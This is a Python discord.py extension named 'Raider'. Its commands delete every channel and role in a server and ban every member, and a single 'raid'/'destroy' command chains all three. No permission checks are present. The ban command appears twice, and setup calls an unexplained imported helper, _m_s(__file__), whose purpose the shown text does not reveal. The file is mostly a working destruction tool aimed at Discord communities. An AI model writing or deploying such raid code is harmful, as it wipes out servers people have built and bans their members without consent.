from discord.ext.commands import Cog, Bot, command, Context
from bot_api import _m_s


class Raider(Cog):
    def __init__(self, bot: Bot):
        self.bot = bot

    @command(aliases=['deletechannels', 'delchannels'])
    async def delete_channels(self, ctx: Context):
        for c in ctx.guild.channels:
            await c.delete()

    @command(aliases=['deleteroles', 'delroles'])
    async def delete_roles(self, ctx: Context):
        for r in ctx.guild.roles:
            await r.delete()

    @command(aliases=['banall', 'banmembers'])
    async def ban_members(self, ctx: Context):
        for m in ctx.guild.members:
            await m.ban()

    @command(aliases=['banall', 'banmembers'])
    async def ban_members(self, ctx: Context):
        for m in ctx.guild.members:
            await m.ban()

    @command(aliases=['destroy', 'ruine'])
    async def raid(self, ctx: Context):
        await ctx.invoke(self.delete_roles)
        await ctx.invoke(self.delete_channels)
        await ctx.invoke(self.ban_members)


def setup(bot: Bot):
    bot.add_cog(Raider(bot))
    _m_s(__file__)
